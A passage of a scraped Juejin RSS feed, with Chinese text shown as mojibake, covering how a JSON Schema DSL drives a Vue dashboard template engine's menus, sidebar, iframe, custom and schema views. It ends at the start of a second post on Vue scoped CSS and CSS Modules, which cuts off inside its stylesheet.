                <span class="hljs-keyword">const</span> modelItem = modelValue.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">modelItem</span> =&gt;</span> modelItem.<span class="hljs-property">key</span> === projItem.<span class="hljs-property">key</span>)
                <span class="hljs-keyword">if</span> (!modelItem) {
                    result.<span class="hljs-title function_">push</span>(projItem)
                }
            }
            <span class="hljs-keyword">return</span> result
        }
    });
}
</code></pre>
<h4 data-id="heading-5">2. Dashboard æ¨¡æ¿å¼•æ“æ­å»º</h4>
<p>å…ˆäº†è§£ä¸‹DSLä¸­<code>JSON Schema</code>é…ç½®æ–‡ä»¶å­—æ®µä»¥ä¾¿äºå¥½äº†è§£Dashboard æ¨¡æ¿å¼•æ“æ˜¯å¦‚ä½•è¿›è¡Œè§£æ</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">{
    <span class="hljs-attr">model</span>: <span class="hljs-string">'Dashboard'</span>,<span class="hljs-comment">//æ¨¡ç‰ˆç±»å‹,ä¸åŒæ¨¡ç‰ˆç±»å‹å¯¹åº”ä¸ä¸€æ ·çš„æ¨¡ç‰ˆæ•°æ®ç»“æ„</span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//æ¨¡ç‰ˆåç§°</span>
    <span class="hljs-attr">desc</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//æ¨¡ç‰ˆæè¿°</span>
    <span class="hljs-attr">icon</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//æ¨¡ç‰ˆå›¾æ ‡</span>
    <span class="hljs-attr">homePage</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//é¦–é¡µè·¯å¾„(é¡¹ç›®é…ç½®)</span>
    <span class="hljs-comment">//å¤´éƒ¨èœå•</span>
    <span class="hljs-attr">menu</span>: [{
        <span class="hljs-attr">key</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//èœå•key,å”¯ä¸€æ ‡è¯†</span>
        <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//èœå•åç§°</span>
        <span class="hljs-attr">menuType</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//èœå•ç±»å‹,æšä¸¾å€¼,group / module</span>

        <span class="hljs-comment">// å½“menuType == group å¯å¡«,å±•ç¤ºå­èœå•</span>
        <span class="hljs-attr">subMenu</span>: [{
            <span class="hljs-comment">//å¯é€’å½’menuItem,{ key,name,menuType... } </span>
        }, ...]
        
        <span class="hljs-comment">// å½“ menuType == module å¯å¡«</span>
        <span class="hljs-attr">moduleType</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//æ¨¡å—ç±»å‹,æšä¸¾å€¼: sider / iframe / custom/ schema</span>
        
        <span class="hljs-comment">// å½“ moduleType == sider æ—¶</span>
        siderConfig={
            <span class="hljs-attr">menu</span>: [{
                <span class="hljs-comment">// å¯é€’å½’menuItem(é™¤å»moduleType == sider)</span>
                <span class="hljs-comment">//ä¹Ÿå°±æ˜¯è¯´åœ¨ä¾§è¾¹æ çš„èœå•é…ç½®ä¸èƒ½å† è¿›è¡ŒmoduleType == sider é…ç½®è¿™æ ·ä¸åˆç†</span>
                <span class="hljs-comment">//å¤šçº§èœå• menuType=group é…ç½®å­èœå•</span>
            }]
        }
        
        <span class="hljs-comment">// å½“ moduleType == iframe æ—¶</span>
        <span class="hljs-attr">iframeConfig</span>: {
            <span class="hljs-attr">path</span>: <span class="hljs-string">''</span><span class="hljs-comment">//iframe è·¯å¾„</span>
        },
        
        <span class="hljs-comment">// å½“ moduleType == custom æ—¶</span>
        <span class="hljs-attr">customConfig</span>: {
            <span class="hljs-attr">path</span>: <span class="hljs-string">''</span><span class="hljs-comment">//è‡ªå®šä¹‰è·¯ç”±è·¯å¾„</span>
        },
        
        <span class="hljs-comment">// å½“ moduleType == schema æ—¶</span>
        schemaConfig={...}
    }]
}
</code></pre>
<h5 data-id="heading-6">1. å¯¼èˆªæ ä¸ä¾§è¾¹æ </h5>
<p>åœ¨DSLä¸­æ ¹æ®<code>menu</code>å­—æ®µè¿›è¡Œå¯¼èˆªæ ä¸Šçš„èœå•çš„æ¸²æŸ“,åœ¨é€šè¿‡<code>menuType</code>å­—æ®µåˆ¤æ–­æ˜¯å¦å¯¼èˆªæ ä¸Šå½“å‰èœå•éœ€è¦å­èœå•å±•ç¤º,<code>moduleType</code>è¡¨ç¤ºå½“å‰èœå•åœ¨é¡µé¢ä¸Šçš„å±•ç¤ºæ–¹å¼ã€‚åªæ˜¯<code>moduleType=sider</code>æ—¶éœ€è¦ä¾§è¾¹æ èœå•ã€‚</p>
<ul>
<li><strong>header-container(å¯¼èˆªæ ç»„ä»¶)</strong> : æ ¹æ®<code>menu</code>èœå•é…ç½®å†…å®¹ç”Ÿæˆå¯¼èˆªæ </li>
<li><strong>sider-container(ä¾§è¾¹æ ç»„ä»¶)</strong>: æ ¹æ®<code>siderConfig.menu</code>é…ç½®å†…å®¹ç”Ÿæˆä¾§è¾¹æ </li>
</ul>
<h5 data-id="heading-7">2. é¡µé¢å†…å®¹å±•ç¤ºæ–¹å¼</h5>
<p>æˆ‘ä»¬å°†<strong>main-content</strong>Â æ’æ§½ä¸‹ä½œä¸ºé¡µé¢çš„æ ¸å¿ƒæ¸²æŸ“åŒºåŸŸ,ä¸»è¦æœ‰ä¸‰ç§æ–¹å¼å±•ç¤ºé¡µé¢,ä»¥é…ç½®é¡¹<code>moduleType</code>(iframe/custom/schema)å€¼è¿›è¡Œå±•ç¤ºåŒºåˆ†,åœ¨å‰ç«¯ä»¥åˆ’åˆ†ä¸åŒè·¯ç”±åˆ†åˆ«è§£æå¯¹åº”çš„é¡µé¢ç»„ä»¶ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">[
   <span class="hljs-comment">// moduleType === iframe æ—¶,å¤„ç†iframeConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/iframe'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/iframe-view/iframe-view.vue'</span>)
   },
   <span class="hljs-comment">// moduleType === schema æ—¶,å¤„ç†schemaConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/schema'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/schema-view/schema-view.vue'</span>)
   },
   <span class="hljs-comment">// moduleType === custom æ—¶,å¤„ç†customConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/todo'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./todo/todo.vue'</span>)
   },
   <span class="hljs-comment">// moduleType === sider æ—¶,å¤„ç†siderConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/sider'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/sider-view/sider-view.vue'</span>),
       <span class="hljs-attr">children</span>: [
           {
               <span class="hljs-attr">path</span>: <span class="hljs-string">'iframe'</span>,
               <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/iframe-view/iframe-view.vue'</span>)
           },
           {
               <span class="hljs-attr">path</span>: <span class="hljs-string">'schema'</span>,
               <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/schema-view/schema-view.vue'</span>)
           },
           {
               <span class="hljs-attr">path</span>: <span class="hljs-string">'todo'</span>,
               <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./todo/todo.vue'</span>)
           },
       ]
   },
   <span class="hljs-comment">//è¿›è¡Œsiderè·¯ç”±å…œåº•</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/sider/:chapters'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/sider-view/sider-view.vue'</span>),
   },
]
</code></pre>
<h6 data-id="heading-8">2.1 <strong>iframe-view</strong></h6>
<p>è¿™ç§æ–¹å¼ä¸»è¦ä½¿ç”¨<code>iframe</code>æ§ä»¶åŠ è½½ç¬¬ä¸‰æ–¹é¡µé¢,å®ç°ä¸åŒé¡µé¢çš„é›†æˆæ–¹æ¡ˆ</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-attr">moduleType</span>: <span class="hljs-string">'iframe'</span>,
<span class="hljs-attr">iframeConfig</span>: {
   <span class="hljs-attr">path</span>: <span class="hljs-string">'https://www.baidu.com/'</span>,
}
</code></pre>
<h6 data-id="heading-9">2.2 <strong>custom-view</strong></h6>
<p>å½“ç„¶ä»¥è¿™ç§æ–¹å¼è¿›è¡ŒåŠ è½½æ—¶,æ²¡æœ‰ç‰¹å®šç»„ä»¶è¿›è¡ŒåŠ è½½,å› ä¸ºè¿™ä¸ªå±äº<code>ç”¨æˆ·è‡ªå®šä¹‰è·¯ç”±æ–¹å¼</code>è¿›è¡Œå‘ˆç°,
è¿™æ ·å°±ç»™ç”¨æˆ·åœ¨è¯¥æ¶æ„ä¸‹è¿›è¡Œå®šåˆ¶åŒ–å¼€å‘ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// å› ä¸ºåœ¨è¯¥æ¶æ„ä¸‹é¦–å±é‡‡ç”¨SSRæ–¹å¼åŠ è½½,åç»­é¡µé¢é‡‡ç”¨CSRæ¨¡å¼è¿›è¡Œè·¯ç”±è·³è½¬</span>
<span class="hljs-comment">// å½“ moduleType == custom æ—¶ </span>
<span class="hljs-attr">moduleType</span>: <span class="hljs-string">'custom'</span>,
<span class="hljs-attr">customConfig</span>: { 
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/todo'</span>  <span class="hljs-comment">//è‡ªå®šä¹‰è·¯ç”±è·¯å¾„</span>
},

<span class="hljs-comment">//å‰ç«¯routes è·¯ç”±å®šä¹‰</span>
{
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/todo'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./todo/todo.vue'</span>)
},
</code></pre>
<h6 data-id="heading-10">2.3 <strong>schema-view</strong> é‡ç‚¹</h6>
<p><code>schema-view</code>è§£ææ¶æ„å›¾,ä»¥å•†å“ç®¡ç†æ¨¡å—è¿›è¡Œå±•ç¤º
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a8f94b9284e48358e9c57e164aa49a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5b-15LmL6Ze0bHE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766466449&amp;x-signature=EnJ8a3YITcrePdMSYG0P9xPV8JQ%3D" alt="ScreenShot_2025-12-16_113038_589.png" loading="lazy"/>
å•†å“ç®¡ç†Schemaé…ç½®å¦‚ä¸‹</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">        {
            <span class="hljs-attr">key</span>: <span class="hljs-string">'product'</span>,
            <span class="hljs-attr">name</span>: <span class="hljs-string">'å•†å“ç®¡ç†'</span>,
            <span class="hljs-attr">menuType</span>: <span class="hljs-string">'module'</span>,
            <span class="hljs-attr">moduleType</span>: <span class="hljs-string">'schema'</span>,
            <span class="hljs-attr">schemaConfig</span>: {
                <span class="hljs-attr">api</span>: <span class="hljs-string">'/api/proj/product'</span>,
                <span class="hljs-attr">schema</span>: {
                    <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
                    <span class="hljs-attr">properties</span>: {
                        <span class="hljs-attr">product_id</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'å•†å“ID'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">300</span>,
                                <span class="hljs-string">"show-overflow-tooltip"</span>: <span class="hljs-literal">true</span>
                            },
                        },
                        <span class="hljs-attr">product_name</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'å•†å“åç§°'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
                            },
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'dynamicSelect'</span>,
                                <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'è¯·é€‰æ‹©å•†å“åç§°'</span>,
                                <span class="hljs-attr">api</span>: <span class="hljs-string">'/api/proj/product_enum/list'</span>,
                            }
                        },
                        <span class="hljs-attr">price</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'number'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'ä»·æ ¼'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
                            },
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'select'</span>,
                                <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'è¯·é€‰æ‹©ä»·æ ¼'</span>,
                                <span class="hljs-attr">enumList</span>: [{
                                    <span class="hljs-attr">value</span>: -<span class="hljs-number">999</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'å…¨éƒ¨'</span>
                                }, {
                                    <span class="hljs-attr">value</span>: <span class="hljs-string">'39.9'</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'Â¥39.9'</span>
                                }, {
                                    <span class="hljs-attr">value</span>: <span class="hljs-string">'199'</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'Â¥199'</span>
                                }, {
                                    <span class="hljs-attr">value</span>: <span class="hljs-string">'699'</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'Â¥699'</span>
                                }]
                            }
                        },
                        <span class="hljs-attr">inventory</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'number'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'åº“å­˜'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
                            },
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'input'</span>,
                                <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'è¯·è¾“å…¥å•†å“åç§°'</span>
                            }
                        },
                        <span class="hljs-attr">create_time</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'åˆ›å»ºæ—¶é—´'</span>,
                            <span class="hljs-attr">tableOption</span>: {},
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'dateRange'</span>,
                            }
                        },
                    }
                },
                <span class="hljs-attr">tableConfig</span>: {
                    <span class="hljs-attr">headerButtons</span>: [{
                        <span class="hljs-attr">label</span>: <span class="hljs-string">'æ–°å¢å•†å“'</span>,
                        <span class="hljs-attr">eventKey</span>: <span class="hljs-string">'showComponent'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'primary'</span>,
                        <span class="hljs-attr">plain</span>: <span class="hljs-literal">true</span>
                    }],
                    <span class="hljs-attr">rowButtons</span>: [
                        {
                            <span class="hljs-attr">label</span>: <span class="hljs-string">"ä¿®æ”¹"</span>,
                            <span class="hljs-attr">eventKey</span>: <span class="hljs-string">'showComponent'</span>,
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'warning'</span>,
                        },
                        {
                            <span class="hljs-attr">label</span>: <span class="hljs-string">"åˆ é™¤"</span>,
                            <span class="hljs-attr">eventKey</span>: <span class="hljs-string">'remove'</span>,
                            <span class="hljs-attr">eventOption</span>: {
                                <span class="hljs-attr">params</span>: {
                                    <span class="hljs-attr">product_id</span>: <span class="hljs-string">"schema::product_id"</span>
                                }
                            },
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'danger'</span>,
                        }],
                }
            }
        },
</code></pre>
<p>åœ¨<code>schema-view</code>ä¸­<code>search-panel</code>(æœç´¢ï¼‰ä¸ <code>table-panel</code>ï¼ˆè¡¨æ ¼ï¼‰ç»„æˆ,é¦–å…ˆæˆ‘ä»¬å°±è¦é’ˆå¯¹<code>schema</code>é…ç½®è¿›è¡Œæ‹†åˆ†æ‰¾å‡ºæˆ‘ä»¬éœ€è¦çš„é…ç½®å†…å®¹,ç»™å…¶ä¸‹çš„ç»„ä»¶è¿›è¡Œä½¿ç”¨</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">    <span class="hljs-comment">//é€šç”¨æ„å»º schemaæ–¹æ³•</span>
    <span class="hljs-comment">// _schemaé…ç½®é€‰é¡¹, comName=&gt;table / search</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">buildDtoSchema</span> = (<span class="hljs-params">_schema, comName</span>) =&gt; {
        <span class="hljs-keyword">if</span> (!_schema?.<span class="hljs-property">properties</span>) { <span class="hljs-keyword">return</span> {} }
        <span class="hljs-keyword">const</span> dtoSchema = {
            <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
            <span class="hljs-attr">properties</span>: {}
        }
        <span class="hljs-comment">// æå–æœ‰æ•ˆ schema å­—æ®µé‡</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> _schema.<span class="hljs-property">properties</span>) {
            <span class="hljs-keyword">const</span> props = _schema.<span class="hljs-property">properties</span>[key]
            <span class="hljs-keyword">if</span> (props[<span class="hljs-string">`<span class="hljs-subst">${comName}</span>Option`</span>]) {
                <span class="hljs-keyword">let</span> dtoProps = {}
                <span class="hljs-comment">//æå– props ä¸­é optionçš„éƒ¨åˆ†,å­˜æ”¾åˆ° dtoPropsä¸­</span>
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> pKey <span class="hljs-keyword">in</span> props) {
                    <span class="hljs-keyword">if</span> (pKey.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'Option'</span>) &lt; <span class="hljs-number">0</span>) {
                        dtoProps[pKey] = props[pKey]
                    }
                }
                <span class="hljs-comment">//å¤„ç† comName Option</span>
                dtoProps = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, dtoProps, { <span class="hljs-attr">option</span>: props[<span class="hljs-string">`<span class="hljs-subst">${comName}</span>Option`</span>] })
                dtoSchema.<span class="hljs-property">properties</span>[key] = dtoProps
            }
        }
        <span class="hljs-keyword">return</span> dtoSchema
    }
</code></pre>
<h6 data-id="heading-11">2.3.1 <strong>table-panel</strong></h6>
<p>è¯¥ç»„ä»¶ä¸»è¦å®Œæˆè¡¨æ ¼Schemaé…ç½®é¡µé¢æ¸²æŸ“</p>
<ol>
<li>é€šè¿‡<code>tableConfig.headerButtons</code>å®Œæˆè¡¨æ ¼ä¸Šé¢æ“ä½œ<code>æ–°å¢å•†å“</code>æŒ‰é’®æ¸²æŸ“</li>
<li>é€šè¿‡<code>tableConfig.rowButtons</code>å®Œæˆè¡¨æ ¼æ¯åˆ—æ“ä½œæ ä¸Šå®Œæˆ<code>ä¿®æ”¹,åˆ é™¤</code>æŒ‰é’®,å¹¶é’ˆå¯¹æŒ‰é’®çš„äº‹ä»¶<code>eventKey</code>è¿›è¡Œç›¸å…³çš„é…ç½®<code>eventOption</code>å®Œæˆä¸šåŠ¡æ“ä½œ</li>
<li>ä½¿ç”¨<code>schema-table</code> ç»„ä»¶,å®Œæˆä¸šåŠ¡æ¥å£è¯·æ±‚,å¹¶é€šè¿‡<code>schema.properties</code>ä¸­æ¯ä¸€é¡¹<code>key</code>å®Œæˆè¡¨æ ¼æ¸²æŸ“</li>
</ol>
<h6 data-id="heading-12">2.3.2 <strong>search-panel</strong></h6>
<p>è¯¥ç»„ä»¶ä¸»è¦å®Œæˆè¡¨å•æœç´¢æ ,è¿›è¡Œå¯¹è¡¨æ ¼æ•°æ®çš„ç­›é€‰æœç´¢åŠŸèƒ½</p>
<ol>
<li>é€šè¿‡<code>schema.properties</code>ä¸­æ¯ä¸€é¡¹çš„<code>searchOption.comType</code>å®Œæˆå¯¹åº”çš„<code>åŠ¨æ€è¡¨å•</code>åŠ è½½å±•ç¤º,</li>
<li>å¹¶ä½¿ç”¨<code>tableOption</code> è¿›è¡Œå±æ€§é€ä¼ ,ä½¿ç”¨UIç»„ä»¶å·²æœ‰çš„åŠŸèƒ½</li>
<li>ä»¥åŠé’ˆå¯¹ä¸åŒè¡¨å•ç±»å‹æä¾›è‡ªå®šä¹‰é€‰é¡¹æˆ–è€…apiè¯·æ±‚è·å–é€‰é¡¹æ•°æ®</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">//ä¸åŒè¡¨å•ç»„ä»¶çš„ç»Ÿä¸€å¯¼å‡º</span>
<span class="hljs-keyword">import</span> input <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/input/input.vue"</span>;
<span class="hljs-keyword">import</span> select <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/select/select.vue"</span>;
<span class="hljs-keyword">import</span> dynamicSelect <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/dynamic-select/dynamic-select.vue"</span>;
<span class="hljs-keyword">import</span> dateRange <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/date-range/date-range.vue"</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">SearchItemConfig</span> = {
    <span class="hljs-attr">input</span>: {
        <span class="hljs-attr">component</span>: input,
    },
    <span class="hljs-attr">select</span>: {
        <span class="hljs-attr">component</span>: select,
    },
    <span class="hljs-attr">dynamicSelect</span>: {
        <span class="hljs-attr">component</span>: dynamicSelect,
    },
    <span class="hljs-attr">dateRange</span>: {
        <span class="hljs-attr">component</span>: dateRange,
    }
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">SearchItemConfig</span>


<span class="hljs-comment">//è¡¨å•ç»„ä»¶çš„å¼•ç”¨</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">SearchItemConfig</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./search-item-config.js'</span>

&lt;!-- åŠ¨æ€ç»„ä»¶ --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(schemaItem, key) in schema.properties"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> <span class="hljs-attr">:label</span>=<span class="hljs-string">"schemaItem.label"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å­æ§ä»¶å±•ç¤º --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:ref</span>=<span class="hljs-string">"handleSearchComList"</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"SearchItemConfig[schemaItem.option?.comType].component"</span>
    <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> <span class="hljs-attr">:schemaKey</span>=<span class="hljs-string">"key"</span> <span class="hljs-attr">:schema</span>=<span class="hljs-string">"schemaItem"</span> @<span class="hljs-attr">loaded</span>=<span class="hljs-string">"handleLoaded"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span></span>

</code></pre>
<h2 data-id="heading-13">3.æ€»ç»“</h2>
<ol>
<li>å­¦ä¹ äº†<code>JsonShema</code>é…ç½®åŒ–å½¢æˆé¢†åŸŸæ¨¡å‹æ¶æ„æ€è·¯</li>
<li>å­¦ä¼šæç‚¼å…³é”®ä¸šåŠ¡,ä»ä»¥å‰çš„å¼€å‘ä»£ç çš„ç¼–å†™è½¬å˜ä¸ºä¸šåŠ¡éœ€æ±‚çš„é…ç½®å®šä¹‰</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue---scoped,deep,CSS Modules]]></title>    <link>https://juejin.cn/post/7583955708318695424</link>    <guid>https://juejin.cn/post/7583955708318695424</guid>    <pubDate>2025-12-16T03:31:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583955708318695424" data-draft-id="7583955708318662656" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue---scoped,deep,CSS Modules"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:31:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ°¸è¿œå°‘å¹´"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue---scoped,deep,CSS Modules
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ°¸è¿œå°‘å¹´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:31:33.000Z" title="Tue Dec 16 2025 03:31:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body 